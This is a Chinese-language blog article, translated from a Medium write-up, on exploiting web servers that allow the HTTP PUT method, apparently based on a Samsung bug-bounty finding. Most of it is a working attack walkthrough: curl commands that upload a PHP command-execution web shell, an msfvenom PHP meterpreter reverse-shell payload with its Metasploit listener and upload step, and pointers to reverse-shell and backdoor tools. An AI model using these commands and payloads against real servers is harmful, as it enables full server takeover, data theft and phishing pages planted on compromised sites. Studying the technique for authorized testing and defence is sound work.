#  利用 PUT 方法导致三星远程代码执行 (RCE)   
 Ots安全   2024-04-26 10:47  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
**什么是 HTTP 方法？**  
  
HTTP 方法是定义客户端想要对由 URI（统一资源标识符）标识的指定资源执行的操作的动词。它们在 HTTP（超文本传输协议）中使用，以促进客户端（例如 Web 浏览器或移动应用程序）与服务器之间的通信。每种方法指定要对资源执行的不同类型的操作。  
  
**常见 HTTP 方法解释**  
1. GET：使用提供的 URI 从服务器检索信息；应该只检索数据而不改变它。  
  
1. HEAD：与 GET 类似，但仅传输状态行和标头部分，不包括响应正文。  
  
1. POST：向服务器发送数据，例如表单提交或文件上传，通常用于创建或更新资源  
  
1. PUT：用提供的内容替换目标资源的所有当前表示。  
  
1. DELETE：删除 URI 标识的目标资源的所有当前表示。  
  
1. TRACE：沿着到目标资源的路径执行消息环回测试，允许客户端查看中间服务器对请求进行了哪些更改或添加。  
  
1. 选项：描述可用于目标资源的通信选项。  
  
**# 现在让我们破解**  
  
**什么是 HTTP PUT 方法**  
  
HTTP PUT 方法通常用于上传保存在服务器上用户提供的 URL 上的数据。如果启用，攻击者可能能够将任意且可能恶意的内容放入应用程序中。  
  
根据服务器的配置，这可能会导致其他用户受到损害（通过上传客户端可执行脚本）、服务器受到损害（通过上传服务器可执行代码）或其他攻击。  
  
**是否启用 PUT 方法测试？**  
  
注意：这是一个如何测试 put 方法是否启用的示例，http://testhtml5.vulnweb.com/是作为安全培训实验室而制作的。  
  
curl您可以通过向特定 URL 发送 PUT 请求并观察响应来测试服务器上是否启用了 PUT 方法。  
  
```
curl -i -s -k -X OPTIONS 'http://testhtml5.vulnweb.com/'
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taedn38pjy2DDSDpXRYcowIGibcHHXGJTQaytOsmbZ6tE8Ph6hJZ2bMrB6kibLYNyicBC2dR7KqOhaCZw/640?wx_fmt=other&from=appmsg "")  
  
2. 通过发送 OPTIONS 方法使用 BurpSuit  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taedn38pjy2DDSDpXRYcowIG9TVPAG3icN17D6zckzTEBZl01naKtSTFpTFUHny1s4q2w6h7Hgx7wIQ/640?wx_fmt=other&from=appmsg "")  
  
检查响应中的“允许”方法：如果 PUT 方法为 ，则尝试文件上传。  
  
如果 PUT 方法启用，则响应标头示例：  
  
```
Allow: HEAD, OPTIONS, GET , PUT
```  
  
  
这是响应如何允许标头结果的另一个示例：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taedn38pjy2DDSDpXRYcowIGgbge1sO8EwC5KyVAAiaATHwwgC72oEHCbuichsfKchqic5ibHPo1G04z8Q/640?wx_fmt=other&from=appmsg "")  
  
**漏洞利用步骤**  
  
1.上传 POC.txt 文件以演示文件上传功能。  
  
```
curl -X PUT "https://site.com/POC.txt"  -H "Content-Type: text/plain" -d "{POC Mohanad}"
```  
  
  
导航到 https://site.com/POC.txt，您应该有这样的响应  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taedn38pjy2DDSDpXRYcowIGGTXl83VS4hbufKzTDzVvFBiaZuoTS3o8ypkWl0sMdVFdexntwszARwA/640?wx_fmt=other&from=appmsg "")  
  
2. 远程代码执行 （RCE）  
  
```
curl -X PUT -d "<?php echo system (($_REQUEST['cmd'])); ?>" http://site.com/shell.php
```  
  
  
<?php echo system (($_REQUEST['cmd'])); ?>   
PHP 代码可在 Linux 和 Windows 服务器上运行。  
  
```
http://site.com/shell.php?cmd=[Your Command Here]
```  
  
  
请记住，如果服务器不支持指定 URL 的 PUT 方法，您可能会收到 405 方法不允许状态代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taedn38pjy2DDSDpXRYcowIGqRXP8uTstV3YEc4so5REibEKz4M0FbRSgNicmxwvibkHjEV0AtHTA6oxg/640?wx_fmt=other&from=appmsg "")  
  
注意：图片取自 https://www.arridae.com/blogs/HTTP-PUT-method.php  
  
**使用 Metasploit**  
  
Metasploit 框架是开发、测试和执行漏洞利用的著名平台。作为一种开源工具，它促进了针对易受攻击系统的一系列漏洞利用。具体来说，在框架中，存在一个模块，能够通过利用 PUT 和 DELETE HTTP 请求来上传和删除 Web 内容，从而利用配置错误的 Web 服务器。用户可以将 ACTION 参数设置为 PUT 或 DELETE，其中 PUT 是默认选项。  
  
1.Create PHP Payload 创建 PHP 有效负载  
  
```
msfvenom -p php/meterpreter/reverse_tcp lhost=[Listening IP] lport=[Listening PORT] -f raw > meterpreter.php
```  
  
  
修改文件以确保脚本包含正确的 PHP 打开和结束标记.  
  
2. 接下来，我们将在 Metasploit 中设置侦听器，以使用以下命令拦截反向 shell：  
  
```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
// Be sure to set the payload here otherwise you might get errors
set lhost [Listening IP]
set lport [Listening PORT]
run
```  
  
  
3. 使用 curl 命令上传文件  
  
```
curl -i -X PUT -T meterpreter.php http://site.com/meterpreter.php
```  
  
  
4. 有时您需要导航到 http://site.com/meterpreter.php 以便 Meterpreter 会话启动。  
  
  
**其他想法**  
  
1.您可以从 GitHub 使用 Shell，示例：  
  
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php?source=post_page-----a1077829d4c5--------------------------------  
  
2.您可以使用非常好的工具称为weevely，您可以创建一个PHP Shell文件，设置密码并连接到主机。  
  
https://www.kali.org/tools/weevely/?source=post_page-----a1077829d4c5--------------------------------  
  
利用 weevely ： https://infosecwriteups.com/how-to-generate-a-php-backdoor-using-weevely-5c1dda909b79  
  
**Impact**  
  
在没有适当安全措施的情况下启用 PUT 方法会为潜在的灾难性后果打开闸门。通过允许任何人（包括恶意行为者）将文件上传到服务器，该漏洞使系统面临多种风险，每种风险都会产生严重影响。  
  
1.服务器入侵：攻击者可以将 shell 上传到服务器上，授予他们对计算机的完全访问和控制权，允许他们执行命令、操纵数据，甚至提升权限。  
  
2.网络钓鱼攻击：借助上传文件的能力，攻击者可以制作模仿合法网站的虚假登录页面。毫无戒心的用户可能会输入他们的凭据，在不知不觉中将其交给攻击者，从而导致帐户泄露并可能被进一步利用。  
  
  
原文翻译自：  
  
https://medium.com/@mohanad.hussam23/exploiting-put-method-led-to-remote-code-execution-rce-on-samsung-a1077829d4c5  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
